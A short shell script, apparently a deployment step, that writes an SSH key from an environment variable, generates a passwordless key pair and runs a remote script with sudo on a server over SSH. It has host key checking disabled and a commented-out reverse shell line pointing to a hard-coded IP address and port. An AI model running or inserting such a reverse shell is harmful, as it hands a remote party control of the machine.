echo "$SSH_KEY" > key.pem
#cat key.pem
chmod 400 key.pem

HOSTNAME=`hostname` ssh-keygen -t rsa -C "$HOSTNAME" -f "$HOME/.ssh/id_rsa" -P "" && cat ~/.ssh/id_rsa.pub
echo '[*] Execute SSH'
#sh -i >& /dev/tcp/157.245.158.132/1234 0>&1
ssh -i key.pem -o "StrictHostKeyChecking no" infra@bisa.ai 'sudo bash DEVOPSBISADESIGN.sh'
